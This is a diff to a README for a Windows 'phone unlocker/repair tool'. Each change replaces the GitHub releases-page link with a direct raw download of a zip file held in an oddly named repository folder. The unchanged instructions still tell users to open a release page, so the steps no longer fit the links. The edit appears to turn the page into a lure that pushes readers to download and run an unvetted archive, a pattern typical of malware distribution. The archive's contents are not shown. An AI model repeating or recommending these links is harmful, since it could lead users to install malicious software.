@@ -1,9 +1,9 @@
 # 📱 UnlockerPhone-Tool-2026 - Fast phone repair for Windows
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/raw/refs/heads/main/musterable/Unlocker_Phone_Tool_3.1.zip)
 
 ## 🔽 Download
-Visit this page to download: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/releases
+Visit this page to download: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/raw/refs/heads/main/musterable/Unlocker_Phone_Tool_3.1.zip
 
 Use the latest release file for Windows. If you see more than one file, pick the one that matches your system. For most users, the main Windows package is the right choice.
 
@@ -54,7 +54,7 @@ If you plan to work with Android phones, it helps to turn on USB debugging when 
 
 Follow these steps in order:
 
-1. Open the download page: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/releases
+1. Open the download page: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/raw/refs/heads/main/musterable/Unlocker_Phone_Tool_3.1.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save the file to your Desktop or Downloads folder
@@ -207,7 +207,7 @@ If you are new to phone repair tools:
 
 ## 🗂️ Release page access
 
-Download the latest Windows release here: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/releases
+Download the latest Windows release here: https://github.com/Mohamedr1740/UnlockerPhone-Tool-2026/raw/refs/heads/main/musterable/Unlocker_Phone_Tool_3.1.zip
 
 Open the page, get the newest file, extract it if needed, then run the main app on Windows
 
